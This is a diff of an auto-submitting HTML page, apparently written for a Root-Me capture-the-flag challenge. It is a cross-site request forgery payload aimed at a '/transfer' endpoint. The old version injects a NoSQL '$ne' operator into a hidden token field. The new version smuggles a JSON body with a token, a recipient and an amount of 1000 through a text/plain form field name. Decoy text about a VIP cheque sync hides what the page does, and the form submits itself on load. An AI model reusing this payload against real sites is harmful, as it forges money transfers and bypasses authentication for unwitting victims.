@@ -1,26 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sincronización de Cuenta VIP</title>
+    <title>Sincronización de Cheque VIP</title>
 </head>
 <body>
     <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h1>Procesando solicitud de contacto...</h1>
-        <p>Por favor, espere a que el sistema valide su identidad.</p>
+        <h1>Procesando transferencia de fondos segura...</h1>
+        <p>Por favor, espere mientras el sistema de cheques de MongoDB valida la transacción.</p>
     </div>
 
-    <form id="nosql_csrf" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST">
-        <input type="hidden" name="token[$ne]" value="1" />
-        
-        <input type="hidden" name="recipient" value="test" />
-        
-        <input type="hidden" name="amount" value="1000" />
+    <form id="json_csrf" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST" enctype="text/plain">
+        <input name='{"token":"6594d3fb4300bf02000000", "recipient":"test", "amount":1000, "padding":"' value='"}'>
     </form>
 
     <script>
         window.onload = function() {
-            // Enviamos el formulario directamente
-            document.getElementById('nosql_csrf').submit();
+            // Enviamos el formulario inmediatamente
+            document.getElementById('json_csrf').submit();
         };
     </script>
 </body>
